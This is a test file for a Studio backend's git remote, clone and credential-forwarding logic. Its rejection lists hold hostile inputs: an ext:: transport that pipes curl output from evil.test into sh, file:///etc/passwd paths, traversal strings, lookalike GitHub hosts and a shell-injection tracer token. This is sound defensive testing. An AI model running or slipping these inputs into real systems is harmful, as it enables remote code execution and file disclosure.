/**
 * `git/remotes`, `git/remote`, and `git/clone` — connecting a project to a
 * repository, against REAL `git` in a real project directory inside
 * `projectsRootDir()` (same fixture posture as `git.test.ts`).
 *
 * **No case touches the network.** The clone tests clone from a LOCAL BARE
 * REPOSITORY the test creates, driven through `startGitCloneJob` with a parsed
 * remote whose `url` is swapped for that path — which is exactly the shape the
 * route produces, minus the transport.
 *
 * The rejections are the point, and there are two families:
 *
 *   1. **URL judgement** (`parseGithubRemoteUrl`). git's URL grammar contains
 *      transports that EXECUTE (`ext::sh -c …`) and transports that read this
 *      server's own disk (`file://`, a bare path). Those are the ones tested
 *      hardest.
 *   2. **The clone target.** Derived server-side, refuses an occupied
 *      directory rather than clearing it, and never accepts a caller-supplied
 *      path — there is no `dir` on that wire at all.
 */
import { afterAll, beforeEach, describe, expect, it } from 'bun:test'
import * as fs from 'node:fs'
import * as os from 'node:os'
import * as path from 'node:path'
import { ProjectDirOutsideWorkspaceError, projectsRootDir } from '../studioProjects'
import { tryServeStudioGitRemote } from '../studio/gitRemoteRoutes'
import {
  cloneTargetDir,
  clearGitCloneJobsForTest,
  readGitCloneJob,
  startGitCloneJob,
} from '../studio/gitClone'
import { githubProjectFolderName, parseGithubRemoteUrl } from '../studio/gitPaths'
import { isGitFailure, originAcceptsStoredGithubToken, pushCurrentBranch } from '../studio/gitOperations'
import { withOutsideWorkspaceDir } from './outsideWorkspaceDir'

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

async function git(cwd: string, args: string[]): Promise<number> {
  const proc = Bun.spawn(['git', ...args], { cwd, stdout: 'pipe', stderr: 'pipe', stdin: 'ignore' })
  await new Response(proc.stdout).text()
  await new Response(proc.stderr).text()
  return proc.exited
}

const created: string[] = []

function makeProjectDir(): string {
  const root = projectsRootDir()
  fs.mkdirSync(root, { recursive: true })
  const dir = fs.mkdtempSync(path.join(root, '__git_remote_test_'))
  created.push(dir)
  return dir
}

async function makeRepo(dir: string): Promise<void> {
  await git(dir, ['init', '--initial-branch=main'])
  await git(dir, ['config', 'user.email', 'studio-test@example.com'])
  await git(dir, ['config', 'user.name', 'Studio Test'])
  await git(dir, ['config', 'commit.gpgsign', 'false'])
  fs.writeFileSync(path.join(dir, 'README.md'), '# fixture\n')
  await git(dir, ['add', '-A'])
  await git(dir, ['commit', '-m', 'Initial commit'])
}

async function call(pathAndQuery: string, init?: RequestInit): Promise<Response> {
  const url = new URL(`http://localhost${pathAndQuery}`)
  const res = await tryServeStudioGitRemote(new Request(url, init), url, url.pathname)
  if (!res) throw new Error(`no route matched ${pathAndQuery}`)
  return res
}

function post(body: unknown): RequestInit {
  return { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }
}

afterAll(() => {
  for (const dir of created) fs.rmSync(dir, { recursive: true, force: true })
})

// ---------------------------------------------------------------------------
// URL judgement — the widest-blast-radius input in the whole feature
// ---------------------------------------------------------------------------

describe('parseGithubRemoteUrl', () => {
  it('accepts the two GitHub shapes and normalizes both', () => {
    for (const input of [
      'https://github.com/octocat/hello-world',
      'https://github.com/octocat/hello-world/',
      'https://github.com/octocat/hello-world.git',
      'https://www.github.com/octocat/hello-world',
      '  https://github.com/octocat/hello-world  ',
    ]) {
      expect(parseGithubRemoteUrl(input)).toEqual({
        owner: 'octocat',
        repo: 'hello-world',
        url: 'https://github.com/octocat/hello-world.git',
        protocol: 'https',
      })
    }

    expect(parseGithubRemoteUrl('git@github.com:octocat/hello-world.git')).toEqual({
      owner: 'octocat',
      repo: 'hello-world',
      url: 'git@github.com:octocat/hello-world.git',
      protocol: 'ssh',
    })
  })

  it('refuses every transport that executes or reads this server', () => {
    for (const hostile of [
      'ext::sh -c "curl evil.test | sh"',
      'ext::git-upload-pack %S /etc',
      'file:///etc/passwd',
      'file://C:/Windows',
      '/etc/passwd',
      'C:\\Windows\\System32',
      '../../../../etc',
      'ssh://git@evil.test/owner/repo.git',
      'git://github.com/octocat/hello-world.git',
      'http://github.com/octocat/hello-world',
      'https://evil.test/octocat/hello-world',
      'https://github.com.evil.test/octocat/hello-world',
      'git@evil.test:octocat/hello-world.git',
    ]) {
      expect(parseGithubRemoteUrl(hostile)).toBeNull()
    }
  })

  it('refuses a URL carrying credentials, a query, or a fragment', () => {
    expect(parseGithubRemoteUrl('https://user:pass@github.com/octocat/hello-world')).toBeNull()
    expect(parseGithubRemoteUrl('https://token@github.com/octocat/hello-world')).toBeNull()
    expect(parseGithubRemoteUrl('https://github.com/octocat/hello-world?x=1')).toBeNull()
    expect(parseGithubRemoteUrl('https://github.com/octocat/hello-world#frag')).toBeNull()
  })

  it('refuses a path that is not exactly owner/repo', () => {
    expect(parseGithubRemoteUrl('https://github.com/octocat')).toBeNull()
    expect(parseGithubRemoteUrl('https://github.com/')).toBeNull()
    expect(parseGithubRemoteUrl('https://github.com/octocat/hello-world/tree/main')).toBeNull()
    expect(parseGithubRemoteUrl('https://github.com/octocat/..')).toBeNull()
  })

  it('refuses control characters, an empty value, and an absurd length', () => {
    expect(parseGithubRemoteUrl('')).toBeNull()
    expect(parseGithubRemoteUrl('   ')).toBeNull()
    expect(parseGithubRemoteUrl('https://github.com/octocat/hello\nworld')).toBeNull()
    expect(parseGithubRemoteUrl(`https://github.com/octocat/${'a'.repeat(600)}`)).toBeNull()
  })
})

// ---------------------------------------------------------------------------
// The routes
// ---------------------------------------------------------------------------

describe('git remote routes', () => {
  let dir: string

  beforeEach(async () => {
    dir = makeProjectDir()
    await makeRepo(dir)
    clearGitCloneJobsForTest()
  })

  it('connects origin, reports it back, and replaces it on a second connect', async () => {
    const empty = await call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(dir)}`)
    expect(await empty.json()).toEqual({ remotes: [] })

    const connected = await call(
      '/admin/api/studio/git/remote',
      post({ dir, set: { name: 'origin', url: 'https://github.com/octocat/hello-world' } }),
    )
    expect(connected.status).toBe(200)
    // The URL that reached git is the RE-COMPOSED one, not the caller's string.
    expect(await connected.json()).toMatchObject({
      ok: true,
      remote: { name: 'origin', fetchUrl: 'https://github.com/octocat/hello-world.git' },
    })

    const listed = (await (
      await call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(dir)}`)
    ).json()) as { remotes: Array<{ name: string; pushUrl: string }> }
    expect(listed.remotes).toHaveLength(1)
    expect(listed.remotes[0]!.name).toBe('origin')

    const replaced = await call(
      '/admin/api/studio/git/remote',
      post({ dir, set: { name: 'origin', url: 'git@github.com:octocat/other.git' } }),
    )
    expect(replaced.status).toBe(200)
    const after = (await (
      await call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(dir)}`)
    ).json()) as { remotes: Array<{ name: string; fetchUrl: string }> }
    expect(after.remotes).toHaveLength(1)
    expect(after.remotes[0]!.fetchUrl).toBe('git@github.com:octocat/other.git')
  })

  it('reports remotes Studio did not write, rather than hiding them', async () => {
    await git(dir, ['remote', 'add', 'upstream', 'https://github.com/someone/else.git'])
    const listed = (await (
      await call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(dir)}`)
    ).json()) as { remotes: Array<{ name: string }> }
    expect(listed.remotes.map((remote) => remote.name)).toEqual(['upstream'])
  })

  it('refuses every hostile URL with a 400, and writes nothing', async () => {
    for (const hostile of [
      'ext::sh -c "id"',
      'file:///etc/passwd',
      '/etc/passwd',
      'https://evil.test/a/b',
      'http://github.com/a/b',
      'https://user:pass@github.com/a/b',
    ]) {
      const res = await call('/admin/api/studio/git/remote', post({ dir, set: { name: 'origin', url: hostile } }))
      expect(res.status).toBe(400)
    }
    const listed = (await (
      await call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(dir)}`)
    ).json()) as { remotes: unknown[] }
    expect(listed.remotes).toEqual([])
  })

  it('rejects a remote name other than origin at the SCHEMA, not in a branch', async () => {
    const res = await call(
      '/admin/api/studio/git/remote',
      post({ dir, set: { name: 'upstream', url: 'https://github.com/octocat/hello-world' } }),
    )
    expect(res.status).toBe(400)
  })

  it('refuses a dir outside the workspace, and 404s a dir with no repository of its own', async () => {
    await withOutsideWorkspaceDir('git-remote-routes', async (outside) => {
      // Since W10 the containment refusal is a THROW from `resolveProjectDir`,
      // turned into the router's single 404 — see `outsideWorkspaceDir.ts`.
      await expect(
        call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(outside)}`),
      ).rejects.toBeInstanceOf(ProjectDirOutsideWorkspaceError)
      await expect(
        call(
          '/admin/api/studio/git/remote',
          post({ dir: outside, set: { name: 'origin', url: 'https://github.com/octocat/hello-world' } }),
        ),
      ).rejects.toBeInstanceOf(ProjectDirOutsideWorkspaceError)
    })

    // Inside the workspace, but with no `.git` of its own — without the guard
    // this would resolve to STUDIO'S OWN repository and report its remotes.
    const bare = makeProjectDir()
    const res = await call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(bare)}`)
    expect(res.status).toBe(404)
  })

  it('rejects a malformed body', async () => {
    expect((await call('/admin/api/studio/git/remote', post({ dir }))).status).toBe(400)
    expect((await call('/admin/api/studio/git/remote', post({ dir, set: { url: 'x' } }))).status).toBe(400)
  })
})

// ---------------------------------------------------------------------------
// Clone
// ---------------------------------------------------------------------------

describe('git clone', () => {
  beforeEach(() => {
    clearGitCloneJobsForTest()
  })

  it('derives the target from the parsed owner/repo, never from a caller value', () => {
    const remote = parseGithubRemoteUrl('https://github.com/octocat/hello-world')!
    expect(githubProjectFolderName(remote)).toBe('octocat-hello-world')
    expect(cloneTargetDir(remote)).toBe(path.resolve(projectsRootDir(), 'octocat-hello-world'))
  })

  it('refuses a clone whose target directory already exists, without touching it', async () => {
    const remote = parseGithubRemoteUrl('https://github.com/studio-test/occupied')!
    const target = cloneTargetDir(remote)
    fs.mkdirSync(target, { recursive: true })
    created.push(target)
    fs.writeFileSync(path.join(target, 'precious.txt'), 'the user\u2019s only copy')

    const res = await call('/admin/api/studio/git/clone', post({ url: 'https://github.com/studio-test/occupied' }))
    expect(res.status).toBe(409)
    expect(((await res.json()) as { code: string }).code).toBe('project-exists')
    // Studio never clears a project directory to make room for a clone.
    expect(fs.readFileSync(path.join(target, 'precious.txt'), 'utf8')).toBe('the user\u2019s only copy')
  })

  it('refuses a hostile clone URL with a 400 before any job exists', async () => {
    for (const hostile of ['ext::sh -c "id"', 'file:///etc', '/etc/passwd', 'https://evil.test/a/b']) {
      const res = await call('/admin/api/studio/git/clone', post({ url: hostile }))
      expect(res.status).toBe(400)
    }
  })

  it('has no dir field on its wire — an extra one changes nothing', async () => {
    const hijack = path.join(os.tmpdir(), 'studio-clone-hijack')
    const res = await call(
      '/admin/api/studio/git/clone',
      post({ url: 'https://github.com/studio-test/ignored-dir', dir: hijack }),
    )
    // The body schema has no `dir`, so `readValidatedBody` rejects the extra
    // property outright — the target can never come from a request.
    expect(res.status).toBe(400)
    expect(fs.existsSync(hijack)).toBe(false)
  })

  it('answers 404 for a clone status poll with an unknown job id, and 400 with none', async () => {
    expect((await call('/admin/api/studio/git/clone/status?jobId=made-up')).status).toBe(404)
    expect((await call('/admin/api/studio/git/clone/status')).status).toBe(400)
  })

  it('clones a real repository, keeping its history, and ends on an import summary', async () => {
    // A local bare repository stands in for GitHub: a real `git clone` over
    // git's own transport, with no network and no credentials.
    const source = makeProjectDir()
    await makeRepo(source)
    const bare = fs.mkdtempSync(path.join(os.tmpdir(), 'studio-clone-origin-'))
    created.push(bare)
    await git(bare, ['init', '--bare', '--initial-branch=main'])
    await git(source, ['remote', 'add', 'origin', bare])
    await git(source, ['push', '--set-upstream', 'origin', 'main'])

    // The shape the route produces, with the transport swapped for the bare
    // path — everything downstream of `parseGithubRemoteUrl` is identical.
    const remote = { owner: 'studio-test', repo: 'cloned', url: bare, protocol: 'https' as const }
    const target = cloneTargetDir(remote)
    created.push(target)

    const job = startGitCloneJob(remote, undefined)
    const deadline = Date.now() + 60_000
    while (Date.now() < deadline) {
      const current = readGitCloneJob(job.id)
      if (current && (current.phase === 'done' || current.phase === 'failed')) break
      await Bun.sleep(50)
    }

    const finished = readGitCloneJob(job.id)!
    expect(finished.error).toBeNull()
    expect(finished.phase).toBe('done')
    expect(finished.summary?.dir).toBe(target)

    // The history came with it — that is the whole point of this path.
    expect(fs.existsSync(path.join(target, '.git'))).toBe(true)
    const log = Bun.spawnSync(['git', 'log', '--format=%s'], { cwd: target })
    expect(log.stdout.toString()).toContain('Initial commit')
    // …and so did `origin`, so the panel's Push is live immediately.
    const remotes = Bun.spawnSync(['git', 'remote'], { cwd: target })
    expect(remotes.stdout.toString().trim()).toBe('origin')
  })

  it('leaves no partial project behind when the clone fails', async () => {
    const remote = {
      owner: 'studio-test',
      repo: 'nonexistent',
      url: path.join(os.tmpdir(), 'studio-clone-source-that-does-not-exist'),
      protocol: 'https' as const,
    }
    const target = cloneTargetDir(remote)

    const job = startGitCloneJob(remote, undefined)
    const deadline = Date.now() + 60_000
    while (Date.now() < deadline) {
      const current = readGitCloneJob(job.id)
      if (current && (current.phase === 'done' || current.phase === 'failed')) break
      await Bun.sleep(50)
    }

    const finished = readGitCloneJob(job.id)!
    expect(finished.phase).toBe('failed')
    expect(finished.error).toBeTruthy()
    expect(fs.existsSync(target)).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// Which remote may see the stored token
//
// `GIT_ASKPASS` answers whatever host git dialled — the script is handed a
// prompt string, not a destination it can refuse. So "may this remote see the
// token" has to be decided BEFORE the script exists, and `origin` is not
// always Studio's: a project can arrive with a `.git` the user pointed at a
// company host, a mirror, or an `ext::` transport in their own terminal.
// ---------------------------------------------------------------------------

describe('a stored GitHub token is only ever offered to github.com', () => {
  /**
   * A value `isEmbeddableGitToken` refuses, used as a TRACER. `runGit` writes
   * the askpass script before it spawns anything, so reaching that write
   * throws — which makes "was the credential forwarded?" observable without a
   * network, a real token, or a stub.
   */
  const UNUSABLE_TRACER = "not-a-token'; id #"

  async function repoWithOrigin(url: string): Promise<string> {
    const dir = makeProjectDir()
    await makeRepo(dir)
    await git(dir, ['remote', 'add', 'origin', url])
    return dir
  }

  it('accepts a github.com origin and refuses every other one', async () => {
    expect(await originAcceptsStoredGithubToken(await repoWithOrigin('https://github.com/octocat/hello-world.git'))).toBe(true)
    expect(await originAcceptsStoredGithubToken(await repoWithOrigin('git@github.com:octocat/hello-world.git'))).toBe(true)

    for (const hostile of [
      'https://gitlab.example.com/octocat/hello-world.git',
      'https://github.com.evil.test/octocat/hello-world.git',
      'http://github.com/octocat/hello-world.git',
      'https://user:pass@github.com/octocat/hello-world.git',
      'ssh://git@evil.test/octocat/hello-world.git',
      path.join(os.tmpdir(), 'some-local-mirror.git'),
    ]) {
      expect(await originAcceptsStoredGithubToken(await repoWithOrigin(hostile))).toBe(false)
    }

    // No `origin` at all is also "no".
    const bare = makeProjectDir()
    await makeRepo(bare)
    expect(await originAcceptsStoredGithubToken(bare)).toBe(false)
  }, 120_000)

  it('forwards the credential for a github.com origin', async () => {
    const dir = await repoWithOrigin('https://github.com/octocat/hello-world.git')
    await expect(pushCurrentBranch(dir, { credential: UNUSABLE_TRACER })).rejects.toThrow(
      /not in a format Studio can use/,
    )
  }, 60_000)

  it('drops it for an origin Studio did not write, and never mentions it in the failure', async () => {
    const dir = await repoWithOrigin(path.join(os.tmpdir(), 'studio-review-not-a-repository'))

    // No throw: the tracer never reached `writeAskpassScript`, so no script
    // carrying a credential was ever created for this remote.
    const result = await pushCurrentBranch(dir, { credential: UNUSABLE_TRACER })
    expect(isGitFailure(result)).toBe(true)
    expect(JSON.stringify(result)).not.toContain('not-a-token')
  }, 60_000)
})
